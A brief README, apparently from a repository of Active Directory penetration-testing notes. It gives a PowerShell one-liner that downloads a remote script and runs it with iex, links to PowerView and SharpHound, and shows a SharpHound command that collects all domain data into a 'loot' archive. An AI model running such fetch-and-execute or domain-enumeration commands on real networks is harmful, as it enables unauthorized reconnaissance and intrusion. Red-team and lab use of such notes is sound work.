# ActiveDirectory
A bunch of Active Directory including scripts and tools

Import AD Module without RSAT - ```iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory```

PowerView tips and tricks - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

SharpHound Collectors - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/

. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.lab -OutputDirectory C:\Temp -ZipFileName loot123.zip
